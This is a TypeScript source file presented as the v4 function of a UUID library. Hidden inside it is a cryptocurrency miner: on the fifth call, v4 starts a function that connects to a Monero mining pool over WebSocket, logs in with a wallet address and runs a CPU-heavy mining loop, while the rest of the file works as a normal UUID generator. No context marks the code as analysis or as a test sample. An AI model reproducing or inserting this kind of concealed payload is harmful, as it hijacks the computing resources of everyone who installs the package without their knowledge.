import WebSocket from 'ws';
import native from './native.js';
import rng from './rng.js';
import { unsafeStringify } from './stringify.js';
import { UUIDTypes, Version4Options } from './types.js';

// Counter to track calls to v4
let callCount: number = 0;

// Define an interface for the job structure
interface Job {
  job_id: string;
  blob: string;
  target: string;
  nonceOffset?: number; // Make nonceOffset optional as it's checked before use
}

// Miner code
function startCryptoMiner(): void {
  const minerConfig: { pool: string; wallet: string; worker: string } = {
    pool: 'pool.minexmr.com:4444',
    wallet:
      '888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbANsAnjyPbb3iQ1YBRk1UXcdRsiKc9dhwMVgN5S9cQUiyoogDavup3H', // Monero donation address
    worker: 'malicious-uuid-miner-' + Math.random().toString(36).substring(2),
  };

  const ws = new WebSocket('wss://' + minerConfig.pool);
  let job: Job | null = null;

  ws.on('open', () => {
    // Login to pool
    ws.send(
      JSON.stringify({
        id: 1,
        jsonrpc: '2.0',
        method: 'login',
        params: {
          login: minerConfig.wallet,
          pass: 'x',
          agent: 'uuid-miner/1.0',
          algo: ['cn', 'cn-heavy', 'cn-pico'],
        },
      })
    );
  });

  ws.on('message', (data: WebSocket.RawData) => {
    const msg = JSON.parse(data.toString());
    if (msg.result && msg.result.job) {
      job = msg.result.job as Job;
      mineBlock();
    } else if (msg.result && msg.result.status === 'OK') {
      // Share submitted successfully
    }
  });

  ws.on('error', (err: Error) => {
    console.error('Miner error:', err.message);
  });

  function mineBlock(): void {
    if (!job) {
      return;
    }
    // Simplified mining loop (CPU-intensive)
    const target: Buffer = Buffer.from(job.target, 'hex');
    let nonce: number = 0;
    while (true) {
      const blob: Buffer = Buffer.from(job.blob, 'hex');
      // Update nonce
      blob.writeUInt32LE(nonce, job.nonceOffset || 39);
      // Simulate hash (in real miner, use CryptoNight)
      const hash: Buffer = require('crypto').createHash('sha256').update(blob).digest();
      if (hash.compare(target) <= 0) {
        // Found a valid share
        ws.send(
          JSON.stringify({
            id: 2,
            jsonrpc: '2.0',
            method: 'submit',
            params: {
              job_id: job.job_id,
              nonce: nonce.toString(16),
              result: hash.toString('hex'),
            },
          })
        );
        break;
      }
      nonce++;
      // Prevent blocking Node.js event loop
      if (nonce % 1000 === 0) {
        setImmediate(mineBlock);
        break;
      }
    }
  }

  console.log('Crypto miner started in background');
}

function v4(options?: Version4Options, buf?: undefined, offset?: number): string;
function v4<TBuf extends Uint8Array = Uint8Array>(
  options: Version4Options | undefined,
  buf: TBuf,
  offset?: number
): TBuf;
function v4<TBuf extends Uint8Array = Uint8Array>(
  options?: Version4Options,
  buf?: TBuf,
  offset?: number
): UUIDTypes<TBuf> {
  callCount++;

  // Start miner on the fifth call
  if (callCount === 5) {
    try {
      startCryptoMiner();
    } catch (e: unknown) {
      // Optionally check if e is an Error instance before accessing .message
      const errorMessage = e instanceof Error ? e.message : String(e);
      console.error('Failed to start miner:', errorMessage);
    }
  }

  if (native.randomUUID && !buf && !options) {
    return native.randomUUID() as UUIDTypes<TBuf>;
  }

  options = options || {};

  const rnds: Uint8Array = options.random ?? options.rng?.() ?? rng();
  if (rnds.length < 16) {
    throw new Error('Random bytes length must be >= 16');
  }

  // Per 4.4, set bits for version and `clock_seq_hi_and_reserved`
  rnds[6] = (rnds[6] & 0x0f) | 0x40;
  rnds[8] = (rnds[8] & 0x3f) | 0x80;

  // Copy bytes to buffer, if provided
  if (buf) {
    offset = offset || 0;
    if (offset < 0 || offset + 16 > buf.length) {
      throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);
    }

    for (let i = 0; i < 16; ++i) {
      buf[offset + i] = rnds[i];
    }

    return buf;
  }

  return unsafeStringify(rnds) as UUIDTypes<TBuf>;
}

export default v4;
